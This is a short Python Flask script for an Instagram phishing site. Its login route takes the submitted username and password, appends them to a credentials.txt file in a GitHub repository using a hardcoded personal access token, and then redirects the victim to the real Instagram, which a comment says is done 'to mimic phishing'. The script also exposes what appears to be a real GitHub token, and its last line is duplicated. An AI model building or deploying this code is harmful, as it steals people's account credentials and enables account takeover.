from flask import Flask, render_template, request, redirect
from github import Github
import base64

app = Flask(__name__)

# GitHub configuration (replace with your details)
GITHUB_TOKEN = "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"  # Your GitHub Personal Access Token
REPO_NAME = "Kul-juX/seed"  # Your GitHub repo (e.g., username/repo)
FILE_PATH = "credentials.txt"  # File in repo to store credentials

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Prepare credential data
    credential_entry = f"Username: {username}, Password: {password}\n"
    
    # Connect to GitHub
    try:
        g = Github(GITHUB_TOKEN)
        repo = g.get_repo(REPO_NAME)
        
        # Get the existing file
        file = repo.get_contents(FILE_PATH)
        current_content = base64.b64decode(file.content).decode('utf-8')
        
        # Append new credentials
        new_content = current_content + credential_entry
        repo.update_file(
            FILE_PATH,
            f"Append credentials for {username}",
            new_content,
            file.sha
        )
    except Exception as e:
        print(f"Failed to update GitHub file: {e}")  # Log error for debugging
    
    # Redirect to real Instagram to mimic phishing
    return redirect('https://www.instagram.com/')

if __name__ == '__main__':
    app.run(debug=True)   app.run(debug=True)